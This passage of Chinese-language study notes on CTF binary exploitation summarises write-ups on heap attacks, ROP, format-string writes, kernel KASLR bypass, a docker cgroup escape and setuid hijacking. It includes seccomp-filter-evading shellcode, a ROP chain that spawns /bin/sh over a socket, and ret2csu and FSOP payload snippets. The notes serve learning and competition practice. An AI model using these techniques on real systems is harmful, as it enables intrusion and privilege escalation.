xd在程序开始时会被calloc/malloc的指针覆盖，即使程序没有PIE也无法直接往里面写值。可以在程序里任意选择一处可读可写地址a，将a的值写为1234，然后将xd写为a。`fmtstr_payload(offset,{a:1234,xd:a})`,`*xd=*(xd->a)=1234`

80. [painter](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/pwn/painter),[wp](https://gist.github.com/awt-256/8e6bdad37116308bd070d5e0aa7a2ebd)
- wasm binary pwn。wasm可用不同高级语言写成，比如C/C++。字节溢出等问题也会在wasm里出现。
- `$global0` is LLVM's RSP in wasm
- [diswasm](https://github.com/wasmkit/diswasm),此工具擅长处理unminified style of wasm
81. [Infernal Break](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#infernal-break)
- 使用qemu挂载iso文件:`qemu-system-x86_64 -boot d -cdrom ctf.iso -m 2048 -cpu host -smp 2`。或开启KVM：`qemu-system-x86_64 -boot d -cdrom ctf.iso -m 2048 -cpu host -smp 2 --enable-kvm`
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)：linux相关提权脚本
- 利用cgroup漏洞实现docker container escaption：[CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups)
  - To exploit this vulnerability we need a cgroup where we can write in the release_agent file, and then trigger it’s invocation by killing all processes in that cgroup. An easy way to do that is to mount a cgroup controller and create a child cgroup within it.
  - Another aspect to consider is the storage-driver used by Docker, which is typically overlayfs. It exposes the full host path of the mount point in /etc/mtab. If we do not find any relevant information here, we can assume that another storage-driver is being used. As explained [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/release_agent-exploit-relative-paths-to-pids) we can obtain the absolute path of the container on the host by bruteforcing the pids on the host.
  - 漏洞利用的bash脚本在wp里
82. [Sentence To Hell](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#sentence-to-hell)
- 格式化字符串漏洞+任意地址写。一个PIE程序里有以下几个地址需要泄露：
  - Stack address（程序记录返回地址的地方。如何获取函数的返回地址：在ret指令处下个断点，rsp处的stack地址即为返回地址存储的地方。同一个函数执行多次，每次的地址都不一样）
  - code base（ghidra或ida里看到的指令加载时的基址，想要使用程序里的gadget或想挑战到程序里的指令段时泄露）
  - libc address（使用libc里的函数或gadget（one gadget））
  - rltd_global address(可选，见下方解释)
- 在这篇[wp](https://github.com/nobodyisnobody/write-ups/tree/main/DanteCTF.2023/pwn/Sentence.To.Hell)里看到了更多思路：
  - 泄露栈地址后覆盖main函数在栈上的返回地址
  - 泄露libc地址后覆盖strlen的got表为one_gadget。程序在执行puts时内部会调用strlen，于是getshell
  - 泄露ld.so地址后构造一个假的fini_array表，内含one_gadget。当程序退出调用run_exit_handlers()时，会被内部调用的_dl_fini执行。_dl_fini函数内部关键代码如下：
  ```c
         /* Is there a destructor function?  */
          if (l->l_info[DT_FINI_ARRAY] != NULL || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
            {
              /* When debugging print a message first.  */
              if (__builtin_expect (GLRO(dl_debug_mask) & DL_DEBUG_IMPCALLS, 0))
                _dl_debug_printf ("\ncalling fini: %s [%lu]\n\n", DSO_FILENAME (l->l_name), ns);

              /* First see whether an array is given.  */
              if (l->l_info[DT_FINI_ARRAY] != NULL)
              {
                ElfW(Addr) *array = (ElfW(Addr) *) (l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
                unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
                while (i-- > 0)
                  ((fini_t) array[i]) ();
              }
  ```
  可覆盖`l->l_info[DT_FINI_ARRAY]`指针（0x13b0 bytes after _rtld_global in ld.so）为构造的假fini_array entry的地址。紧接着array的地址由`l->l_addr`加上`l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`得来，即为构造的假fini_array entry中的第二个指针。可以看出`((fini_t) array[i]) ()`调用了array。既然`d_un`结构声明如下：
  ```c
  ptype l->l_info[DT_FINI_ARRAY]->d_un
  type = union {
      Elf64_Xword d_val;				// address of function that will be called, we put our onegadget here
      Elf64_Addr d_ptr;				// offset from l->l_addr of our structure.似乎就是伪造的fini_array entry的地址在程序里的偏移。例如这题伪造到your_name这个bss段上的变量，其偏移为0x4050。于是这里就填0x4050
  }
  ```
  因为one_gadget直接用条件不满足，于是采用第三种方法使其条件满足。
- 除了将返回地址填为main函数可以获得第二次执行，也可以填为`_start`的。https://github.com/R3dSh3rl0ck/CTF-Competitions-Writeups/tree/main/DanteCTF_2023/sentence
83. [Soulcode](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#soulcode)
- 构造polymorphic open+read+write shellcode绕过seccomp沙盒+过滤。polymorphic shellcode的基本思路在于，先写出一段能满足要求的正常的shellcode，然后找到一个key使之前的shellcode与其异或后均不在blacklist里。发送给题目的shellcode为解码器，真正的shellcode藏在传给解码器的数据里
  - 被过滤的`/x0f/x05`是syscall的字节码，借助polymorphic shellcode的思路，可以让shellcode在执行过程中自己构建出`\x0f\x05`
  ```py
  shellcode = """
  .global _start
  .intel_syntax noprefix
  _start:
      mov rax, 0x2
      lea rdi, [rip+flag]
      xor rsi, rsi
      xor rdx, rdx
      inc byte ptr [rip+syscall1+1]
      inc byte ptr [rip + syscall1]

  syscall1:
      .byte 0x0e
      .byte 0x04

      mov rdi, rax
      xor rax,rax
      mov rsi, rsp
      mov rdx, 0x40
      inc byte ptr [rip + syscall2 + 1]
      inc byte ptr [rip + syscall2]

  syscall2:
      .byte 0x0e
      .byte 0x04

      mov rax, 0x1
      mov rdi, 0x1
      inc byte ptr [rip + syscall3 + 1]
      inc byte ptr [rip + syscall3]

  syscall3:
      .byte 0x0e
      .byte 0x04
  flag:
      .string "flag.txt"
  """
  payload = asm(shellcode)
  ```
  - 类似思路:https://dothidden.xyz/dantectf_2023/soulcode/ ([Writing Custom Shellcode Encoders and Decoders](https://www.ired.team/offensive-security/code-injection-process-injection/writing-custom-shellcode-encoders-and-decoders))
- 由于程序使用strpbrk函数检查输入是否含有黑名单byte，而该函数会在第一个null字节处停止。所以只需要保证shellcode中null字节之前的字节不在黑名单里就好了，后面的正常写。https://github.com/dmur1/ctf-writeups/blob/main/2023_06_03_dantectf_pwn_soulcode_writeup.md
    - 在真正的shellcode面前铺垫多个null字节，然后直接jmp过去。
```py
jmpsc = asm("""
    add rdx, 0x50
    jmp rdx
""")
realsc = asm(shellcraft.open("/flag.txt"))
realsc += asm(shellcraft.read('rax', 'rsp', 0x50))
realsc += asm(shellcraft.write(1, 'rsp', 0x50))
print(realsc)
sc = jmpsc + b"\x00" * (0x50 - len(jmpsc)) + realsc
```
84. [ex](https://nootkroot.github.io/posts/ex-hsctf-2023/)
- ret2libc复习。当题目没有给出使用的libc时，可以多泄露几个got地址再去libc-database里面查，保证只剩下一个可能的libc版本。
85. [baby-ROP-but-unexploitable](https://github.com/n132/CTF-Write-Up/tree/main/2023-GPNCTF/baby-ROP-but-unexploitable)
- `/proc/self/map_files`是一个目录，但是里面的文件名记录着libc等文件的内存映射，意味着可以通过里面的文件名直接获取libc base，而无需读取文件内容。
- ROP获取反弹shell。一种方法已经记录在wp里了，也可以像下面这样：
  ```py
  #https://ctftime.org/writeup/37175
  rop = ROP(libc)
  # rop.close(0)
  # rop.close(1)
  rop.dup2(4, 0)
  rop.rsi = 1
  rop.dup2()
  rop.execve(next(libc.search(b"/bin/sh")), 0, 0)
  ```
86. [all patched up](https://github.com/M0ngi/CTF-Writeups/tree/main/2023/Nahamcon/pwn/all%20patched%20up)
- [ret2csu](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#ret2csu)(万能gadget)实战。其实wp里用的不是ret2csu，是我用了后发现和ctf wiki里有一点不一样，参数的顺序不一致。仍然可以套ctf wiki里的模板，但是要自己根据libc的版本更换参数位置。此题是libc-2.31,顺序为：
```py
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r15 should be the function we want to call
    # rdi=edi=r12d
    # rsi=r13
    # rdx=r14
    payload = b'a' * bof_offset
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38 #这个是固定的
    payload += p64(last)
    p.sendline(payload)
```
- 此题的[另一种解法](https://hackmd.io/@KentangRenyah/BJ5Fiy2Dh#All-Patched-Up)使用了ld.so文件里的gadget。rop不一定要ret2libc，若实在无法泄露libc的地址，ld.so也是可以的。
87. [Limitations](https://hackmd.io/@KentangRenyah/BJ5Fiy2Dh#Limitations)
- 汇编调用ptrace函数+ptrace函数基础知识。ptrace函数可以让一个进程与另一个进程（如fork产生的子进程）沟通，前提是获取另一个进程的process ID。ptrace的PTRACE_POKEDATA选项可以让进程修改另一个进程的代码
  - ptrace(PTRACE_ATTACH,child_id,0,0)
  - ptrace(PTRACE_POKEDATA,chid_id, addr, data)
  - ptrace(PTRACE_DETACH,child_id,0,0)
- 一个进程的seccomp不会影响到另一个进程，fork出来的进程也一样（seccomp的调用在fork之后）
88. [Web Application Firewall](https://hackmd.io/@KentangRenyah/BJ5Fiy2Dh#Web-Application-Firewall)
- [tcache_perthread_struct](https://zafirr31.github.io/posts/imaginary-ctf-2022-zookeeper-writeup/)利用
  - In short, tcache_perthread_struct contains a counter for the number of available (already freed) tcachebin chunks and stores the address entries for each tcachebin size. The address of the tcache_perthread_struct is kept at the second word of a freed tcache chunk. 其中address entries控制着tcache chunk从哪里取。如果我们能覆盖这个地址为free_hook，下次malloc就能直接获取到对应地址处的内存。
89. [storygen](https://github.com/google/google-ctf/tree/master/2023/pwn-storygen)
- linux shebang利用。shebang在bash脚本的第一行，由`#!`开头，用于选择脚本的解释器。也可以用来注入执行任意命令，类似`#!/usr/bin/python3 -c print(123)`。或者利用env的-S参数，将剩下的部分全部拆分成shell命令（默认最多只能拆分一个参数）:`#!/usr/bin/env -S bash -c ls -fl`
90. [Virophage](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/pwn/virophage),[wp](https://github.com/nikosChalk/ctf-writeups/tree/master/uiuctf23/pwn/virophage)
- 32位的可执行文件（binary）中，栈的权限是`rwx`；而64位的可执行文件的栈权限只有`rw-`。
- 32位elf header结构。其中`e_entry`表示进入elf后第一个执行的地址（变相等于控制eip）。使用`execve("file", argv, envp)`调用名为file的elf时，argv会被置于栈上。也就是说，当我们可以控制一个32bit的elf的`e_entry`和argv时，即使那个elf里并没有任何代码，也可以通过栈上的argv getshell。
- 32位纯字母数字（alphanumeric） shellcode编写： http://phrack.org/issues/57/15.html
- https://nyancat0131.moe/post/ctf-writeups/uiu-ctf/2023/writeup/#virophage ：写shellcode时可以在shellcode前加上多个nop，不影响shellcode执行且方便找shellcode在stack上对齐后的位置。
91. [Zapping a Setuid 1](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/pwn/zapping_setuid_1),[wp1](https://github.com/nikosChalk/ctf-writeups/tree/master/uiuctf23/pwn/zapping-a-suid1),[wp2](https://www.youtube.com/watch?v=bmV0EL_cDpA&t=885s)
- [hardlink](https://en.wikipedia.org/wiki/Hard_link):对具有suid的binary做一个hardlink，出来的hardlink也具有suid
- [zapps](https://zapps.app/technology/)初识。zapps也是elf，但是其不使用系统的libc，loader等文件，而是使用自己相对路径下自带的文件。因此这类型elf可以无视系统libc版本。
- [exploit database](https://www.exploit-db.com/):里面有很多不同功能的shellcode
- 此题的思路是，在家目录下对具有setuid的exe做hardlink。因为hardlink保留setuid且hardlink指向exe，现在就可以在家目录下创建恶意的ld-linux-x86-64.so.2并让exe加载，获取shell。
  - wp1使用orw shellcode读取flag
  - wp2使用setuid(0)+execve("/bin/sh")shellcode。对于shellcode.c，可以用`gcc shell.c -o ld-linux-x86-64.so.2 -e main`编译，比视频里的简单一点
92. [Zapping a Setuid 2](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/pwn/zapping_setuid_2),[wp](https://nyancat0131.moe/post/ctf-writeups/uiu-ctf/2023/writeup/#zapping-a-setuid-2)
- 题目与Zapping a Setuid 1类似，目标都是尝试劫持zapp应用的so程序。但是这题开启了`protected_hardlinks`因此无法创建hardlink。不过作者的内核做了一些patch，导致有漏洞：
  - linux内核中的`check_mnt` is used to check if the path is in the same mount namespace as the current task’s mount namespace. By removing this check, the patch allows cross loopback mounting between different mount namespaces.
  - allow unprivileged user to call SYS_open_tree with OPEN_TREE_CLONE flag.
  - allow setuid binary behavior if the user namespace that is holding the current mount is the same as the current user namespace of the task.
- wp里的名词解释
  - [namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html): For a quick explanation, namespaces are used to create isolated environment. 有以下几种namespaces
    - [User namespace](https://man7.org/linux/man-pages/man7/user_namespaces.7.html)
    - [Mount namespace](https://man7.org/linux/man-pages/man7/mount_namespaces.7.html)
    - [Network namespace](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
    - [PID namespace](https://man7.org/linux/man-pages/man7/pid_namespaces.7.html)
    - [Cgroup namespace](https://man7.org/linux/man-pages/man7/cgroup_namespaces.7.html)
    - [IPC namespace](https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html)
    - [Time namespace](https://man7.org/linux/man-pages/man7/time_namespaces.7.html)
    - [UTS namespace](https://man7.org/linux/man-pages/man7/uts_namespaces.7.html)
  - cross loopback mount: refers to the process of mounting a loopback device in one mount namespace and making it accessible in another mount namespace.
  - loopback device: In Linux, a loopback device is a virtual device that allows a file to be treated as a block device. It enables files to be mounted as filesystems, just like physical disks or partitions.
93. Headless Chrome exploit for 73.0.3683.86 (--no-sandbox) V8 version 6.9.0: https://github.com/timwr/CVE-2019-5825/tree/master
94. [himitsu](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/pwn/himitsu),[wp](https://ptr-yudai.hatenablog.com/entry/2023/07/22/184044#Himitsu-Note)
- 若将main函数的返回地址的最后一位设为0，就能泄露argv[0]指向的地址。且由于修改后的返回地址在`__libc_csu_init`里，后面又会重新调用main。使用步骤：
  1. 在main函数保存的rbp处插入一个随机的heap地址。rbp->random heap address，不是把rbp改成heap address
  2. 将main函数的返回地址的最后一位改为0
  3. argv[0]在stack上，将其改为要泄露的地址
  4. 接收地址。如何判断是否成功：地址会跟在`transferring control:`后输出
95. [qjail](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/pwn/qjail),[wp](https://ptr-yudai.hatenablog.com/entry/2023/07/22/184044#qjail)
- 使用qiling运行的程序即使标注了开启PIE和canary，在qiling运行时仍然可以绕过。因为qiling不支持ASLR，每次运行的地址都是一样的，且canary固定为`0x6161616161616100`
96. [wise](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/pwn/wise),[wp](https://ptr-yudai.hatenablog.com/entry/2023/07/22/184044#WISE)
- Crystal语言下的heap pwn。虽然crystal设计的时候是memory-safe的，但是它仍然提供了一些不安全的（unsafe）函数。例如`id_list.to_unsafe`,返回指向id_list的指针。这时候就要注意了，当我们往id_list这个数组里添加元素时，id_list逐渐变大，crystal会自动进行reallocation，原本的数据会被移到其他地方。id_list最开始的指针所指向的空间会被garbage collection回收掉。若不对记录id_list做检查，攻击者就有了一个指向已free区域的指针，从而uaf。
- crystal的heap manager使用linked list管理freed areas，且整数和字符串都有较简单的结构：type/size/capacity/buffer
- 利用environ泄露栈地址
97. [brainjit](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/pwn/brainjit),[wp](https://github.com/nobodyisnobody/write-ups/tree/main/zer0pts.CTF.2023/pwn/brainjit)
- x86_64架构下，syscall的返回地址存储在rcx里。 https://stackoverflow.com/questions/47983371/why-do-x86-64-linux-system-calls-modify-rcx-and-what-does-the-value-mean
98. [permissions](https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/pwn/permissions)
- 在x64架构(大多数架构也是这样)中，即使一块memory被标记为只写(`mmap(NULL, 0x1000, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);`)，它通常都是可读的
99. [hex-converter](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/pwn/hex-converter),[wp](https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/pwn/hex_converter)
- pwntools的p64/p32都不能pack负数。有以下两种方式替代：
  ```py
  import ctypes
  p32(ctypes.c_uint(-80).value)
  #或
  from struct import pack
  struct.pack("<i", -80)
  ```
100. [ELFcrafting-v1](https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/pwn/elf_crafting_1)
- execve不仅可以执行binary executable，还可以是如下格式的脚本文件：`#!interpreter [optional-arg]`（shebang）
101. [I Love FFI](https://surg.dev/amateurs23/#i-love-ffi),[wp2](https://amateurs.team/writeups/AmateursCTF-2023/i-love-ffi)
- rust函数返回值。rust里不一定要使用return来返回结果，函数中最后一个表达式的值，默认作为返回值。 https://hardocs.com/d/rustprimer/function/return_value.html
- rust/C FFI。这道题里表现为C程序调用外部由rust编写的函数。即使在rust和C中用相同的顺序定义struct的字段和布局，编译后两者也会不同。因为编译器会pad struct的字段，让内存访问更快。而rust和C的padding规则不同。C will attempt to align struct fields to their memory size, but will maintain struct order. Rust will also attempt to align struct fields to their memory size, but will not maintain struct order.
102. [ELFCrafting v2](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/pwn/ELFcrafting-v2),[wp](https://surg.dev/amateurs23/#elfcrafting-v2)
- 构建一个极小但可运行的ELF文件。目前最小的64位elf是80字节，所以若题目要求构造的elf比这个更小，就要尝试构造32位elf了。 https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
  - 目前工具自动创建的elf无法做到这么小，所以要手动在汇编里定义header然后用nasm编译。文章里也提供了一些缩减elf大小的技巧
  - x86 shellcode可以在[exploit-db](https://www.exploit-db.com/)找。wp提到了一个21字节的x86 shellcode，以及一个14字节的但是需要/bin/sh已在elf里存在的shellcode。构造elf的话可以把/bin/sh放在data段里
  - 若shellcode的执行开始于`_start`，可以默认寄存器值为0，就不用多余的字节来将一些寄存器设为0了
  - 注意加载程序时不能让程序的地址小于ubuntu的默认vm.mmap_min_addr（0x10000），否则程序会崩溃
- 同作者的更小ELF构建题目： [summit](https://unvariant.pages.dev/writeups/amateursctf-2024/pwn-summit/)。这次仅用了73字节。参考 https://tmpout.sh/3/22.html
103. [perfect-sandbox](https://github.com/itaybel/Weekly-CTF/blob/main/amateursCTF/pwn/perfect-sandbox.md)
- In x86-64 there are 3 TLS entries, two of them accesible via FS and GS registers, FS is used internally by glibc (in IA32 apparently FS is used by Wine and GS by glibc).fs段里可以泄露一些有关栈的信息，汇编这样访问：`mov register, qword ptr fs:offset`
- 预期解和其它非预期解：https://amateurs.team/writeups/AmateursCTF-2023/perfect-sandbox
  - On x64 processors, physical memory is mapped to virtual memory using a page table. The page table specifies how physical memory is mapped to virtual memory and stores the page permission bits and other information. When a virtual memory address is accessed, the processor must walk the page table in order to determine the physical address to access, which takes some time in order to perform. The processor employs a translation lookaside buffer (TLB) to aggressively cache recent virtual to physical memory mappings to reduce the performance impact of translating virtual to physical addresses. 意味着被TLB cache后的虚拟地址->内存访问映射速度要比没有cache过的快很多。假设flag存储在mmap内存中且知道大概地址但不完全，就可以利用这点进行side channel attack，一个一个试出真正的地址。这里唯一的问题是不能随便访问一些不存在的地址，会SEGFAULT。可以用那些访问地址不会触发报错且可以查询内存并访问TLB的指令。如[vmaskmov](https://www.felixcloutier.com/x86/vmaskmov)和[prefetch](https://www.felixcloutier.com/x86/prefetchh)
  - write函数在遇到不合法地址时不会停止运行，只是会报错。而且假如在一段地址里有合法的和非法的（如从0x1337000开始write长度为0x1000000内存），write会自动跳过那些非法的地址，直接打印出合法地址所对应的内容，而且没有报错
104. [simple-heap-v1](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/pwn/simple-heap-v1),[wp](https://amateurs.team/writeups/AmateursCTF-2023/simple-heap-v1)
- When performing allocations with malloc, any allocation greater than MMAP_THRESHOLD_MIN, which is set to 128kb by default, malloc will use mmap instead of its internal heap. The second mmap will always be exactly below the libc in memory. This means that if we can control the size field of a mmapped chunk, we can unmap part of the libc.
- If we inspect the section layout of the libc in memory(`readelf -l libc.so.6`), the .dynsym and .dynstr sections are located underneath the .text section. The .dynsym and .dynstr are used in lazy symbol resolution. If a external function called fgets is called in a binary compiled with lazy linking (indicated by PARTIAL RELRO), the linker will search shared libraries for a symbol defined with the name fgets and use the symbol information to retrieve the function address.
  - After unmapping part of the libc, we can perform another mmap to remap the lower part of the libc with data that we control. We can exploit this to provide malicious values for symbols in the libc to hijack lazy symbol resolution.
  - 感觉unmap libc效果有点像覆盖got表？两者都是劫持函数。只不过got表那个在程序里改，这个直接把libc给改了。其实就是准备要学的[House of Muney](https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation)
- 其他做法： https://github.com/aparker314159/ctf-writeups/blob/main/AmateursCTF2023/simple-heap-v1.md
105. [Frog Math](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/pwn/frog-math),[wp](https://github.com/5kuuk/CTF-writeups/tree/main/amateurs-2023/frogmath)
- on modern x64 processors, mmx registers maps the 64 lsb of the x87 80bit registers. This means that accesses to the mmx registers modify the st(n) registers and vice versa. https://www.cs.utexas.edu/users/moore/acl2/manuals/current/manual/index-seo.php/X86ISA____MMX-REGISTERS-READS-AND-WRITES
  - 在gdb中可用`i r f`指令查看x87寄存器
  - mm7 corresponds to the mantissa of st7 and the mantissa must almost always start with a msb of 1。其它也类似。意味着如果要在里面存地址的话，只能用[subnormal numbers](https://en.wikipedia.org/wiki/Subnormal_number)。It has an exponent of 1 (but stored as 0), can have leading null most significant bits without being equal to 0. 原生python目前不够精确，可以用[mp-math](https://mpmath.org/)
106. libc-2.27的tcache poisoning条件非常宽松，没有地址对齐的限制（申请的空间无需对齐16），只往tcache free 1个chunk就可以篡改fd了（不知道是什么版本以后，要想通过写fd获取任意地址空间的话，至少要free两个chunk，往第二个free的chunk的fd写地址。往第一个写是申请不到的）。写了第一个free进tcache的chunk的fd时，在pwndbg里看bins会显示只有一个chunk，但是可以free两次，free到目标地址后tcache会显示-1……
107. [mailman](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Pwn/mailman),[wp](https://surg.dev/ictf23/)
- 2.35全保护+seccomp（只允许read，write,open,fstat,exit）。漏洞为read after free（uaf）+double free。趁这个机会完整记录一遍思路+技巧吧
  - 泄露libc：分配两个较大的chunk（如1350），free第一个，利用unsorted bin attack+read after free泄露libc地址（第二个多余的chunk应该是用来防止与top chunk合并的）
  - 泄露堆地址：free两个chunk（这里用的是128大小的，应该其他的也行），依次free后就能利用uaf读链表上的地址。但是需要处理safe linking。消除safe linking后尝试拿heap base，用于计算/预测未来申请的堆的地址。额外步骤：若bins里很乱，可以malloc几次把bins清空
  - 思路：这里复习一下，全保护导致不能改got；2.35移除`__free_hook`和`__malloc_hook`；写`__exit_funcs`是hook的替代（function table of exit handlers），当程序通过libc调用`exit()`会调用`__exit_funcs`。但是直接用`_exit()`就不会走handlers了。那么尝试把ropchain（pwntools可以自动化）写入函数返回时的栈帧（不一定要是main的，这题main用exit根本不会返回，但是还有其他函数。再或者，任意调用read的lib function，比如fgets）。这样需要泄露栈地址。通常的方法是泄露libc里的environ，其存储着envp在stack上的地址
  - [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c)：利用double free获取任意地址上的chunk。虽然2.35有double free的一点保护，即不能连续free一个chunk两次。但是中间free另一个chunk即可。原理在于利用double free构造出一个overlapped chunk，然后在申请chunk时覆盖被overlap的chunk的metadata。具体步骤（根据malloc chunk的大小不同，详细步骤也会有点不同，比如 https://nasm.re/posts/mailman/ 每步分配的大小就不一样。这是第一次使用时的步骤，成功后第二次就没那么麻烦了。因为可以重复free A+B和B，两者重叠，继续修改B的metadata）：
    - allocate 7 0x200 sized blocks, this will fill the tcache for 0x200 and makes any other frees end up in a different bin
    - allocate a previous chunk, and our victim chunk, each of size 0x200
    - allocate a 16 byte chunk to prevent any further consolidation past our victim chunk
    - free those 7 original chunks to actually fill the tcache.
    - free our victim chunk, it ends up in the unsorted bin, since its too large for any other bin
    - free our previous chunk, because malloc now sees two large, adjacent chunks, it consoldates them and places a 0x421 size block into the unsorted bin. (malloc automatically allocs 16 bytes more than what we ask, and uses the last byte as a flag, so this is the result of 2 0x210 chunks)
    - free our victim chunk again. This bypasses the naive double free exception, and since our victim chunk has the info for a 0x210 byte block, it gets placed into the tcache
    - alloc a 0x230 sized chunk. Why? Because malloc will split the unsorted block into two, giving us the 0x230 block... but this contains the metadata of our victim chunk, which we now have write control over during our allocation
    - When we now alloc a 0x200 block, we'll get the victim chunk, but then the next address that the tcache is pointed to is any address of our choosing
    - 别忘了修改metadata时地址要safe linking。safe linking时的地址通过调试获得（之前拿的heap基地址派上用场了），且原地址要16字节对齐（尝试分配到stack时更要注意）。具体是拿要分配到的目标地址异或`((chunk_location) >> 12)`（所以要提前调试获得chunk地址）。要是没有对齐会崩溃，把目标地址+8或-8即可
    - 另一篇[wp](https://rektedekte.github.io/CTF-writeups/ImaginaryCTF%202023/mailman/)说，这个攻击还需要分配的地址处所指向的内容也是个地址（The value at the pointer must be an address）
  - FSOP：利用stdout泄露任意地址处数据（这里是environ）。这里不会阐述原理，只记录做法，具体见wp。
    - Set stdout->flags = _IO_MAGIC | (~_IO_NO_WRITES) | IO_IS_CURRENTLY_PUTTING | _IO_IS_APPENDING
    - Set stdout->_IO_write_base to &environ, to make that our buffer
    - Set stdout->_IO_write_ptr = stdout->_IO_write_end = _IO_buf_end to be &environ+8, to make our buffer non zero and just print out the stack leak.
    ```py
    p64(0xfbad1800) + #flags
    p64(environ)*3 + #read_ptrs, don't matter
    p64(environ) +  #write_base
    p64(environ + 0x8)*2 + #write_ptr and end
    p64(environ + 8) + # buf_base
    p64(environ + 8) # buf_end
    ```
    覆盖成功后立刻就能拿到泄露。
108. [Window Of Opportunity](https://hackmd.io/@capri/SyQS6Eo9n)
- linux kernel rop(smep,smap,kaslr,kpti)+modprobe_path.一些security features：
  - kptr_restrict
    - kernel pointers that are printed will (not) be censored
  - perf_event_paranoid
    - controls use of the performance events system by unprivileged users
  - dmesg_restrict
    - control access to kernel buffer (dmesg)

  三者都是用来防止普通用户泄露kernel信息的
- 获取aar的基础上爆破kaslr base。以下三点使爆破成为可能：
  - copy_to_user is fail-safe
    > copy_to_user does not fail even if the kernel address provided is not mapped yet, it simply copies a bunch of null bytes to the userspace buffer. It only throws an error and fails when a kernel address is not physically mappable or does not have the appropriate permissions.
  - kaslr is brute-forceable
    > Unlike in userspace where the ASLR entropy can be as high as 30 bits (1073741824 combinations), the KASLR entropy is only 9 bits (512 combinations) due to space constraints and alignment issues.
  - we know the range of kaslr addresses to brute force
    > The physical address and virtual address of kernel text itself are randomized to a different position separately. The physical address of the kernel can be anywhere under 64TB, while the virtual address of the kernel is restricted between [0xffffffff80000000, 0xffffffffc0000000], the 1GB space.
- 如何找stack canary. canary位于gs:0x28（`$gs_base+0x28`）但gs_base的地址会随机。可以通过泄露kernel image里一个相对于gs_base的指针来计算canary的地址从而泄露canary。canary在runtime才被确定，所以需要关注那些在runtime还可写的空间。比如bss段。使用`grep " b " /proc/kallsyms | head`命令来找到和gs_base相关的地址
- 其他wp：https://nasm.re/posts/iwindow/
  - 可以利用cpu_entry_area泄露base。cpu_entry_area不受kaslr限制，利用gdb在这块内存里搜索与`kernel .text`相关的指针即可获取base
  - 整个initramfs会被映射到kernel memory且偏移固定。因此可以直接在里面尝试搜索flag。参考 https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/initramfs/
109. [setcontext](https://www.cnblogs.com/pwnfeifei/p/15819825.html)
- 利用setcontext处的gadget执行rop。rop链的构造可以使用pwntools的SigreturnFrame()，也可以手动写。当题目开启沙盒时，可将hook改为这里的地址实现orw
110. [scanf与malloc_consolidate](https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_20)
- 当通过scanf，gets等走IO指针的读入函数读入大量数据时，若默认缓冲区（0x400）不够存放这些数据，则会申请一个large bin存放这些数据，例如读入0x666个字节的数据，则会申请0x810大小的large bin，并且在读入结束后，将申请的large bin进行free，其过程中由于申请了large bin，因此会触发malloc_consolidate
111. 阅读[nightmare](https://guyinatuxedo.github.io/)时的笔记
- https://guyinatuxedo.github.io/07-bof_static/bkp16_simplecalc/index.html ：当free的参数是0时，free会直接返回
- https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html ：当输入被转为float再存入内存时如何构造ropchain
- https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html ：格式化字符串修改内存。之前知道格式化字符串利用已输出的字符数来覆盖内存，但是假如已输出的字符数已经超过目标byte了呢？比如已经输出了0x52个字符，但是目标是0xb？答案是再加点字符凑成`0x10b`，因为地址是按byte写的，`0x0b`会留下来，溢出的`0x1`留到下面再继续覆盖。双字节时也是一样的道理，参考下面的 Tokyowesterns 2016 greeting
- https://guyinatuxedo.github.io/11-index/sunshinectf2017_alternatesolution/index.html :nan是唯一一个既不小于某个小数又不大于那个小数的float。比如nan即不大于37.35928345也不小于它，就连37.35928345本身都不行，因为这个小数“contains more decimal places than a float handles”
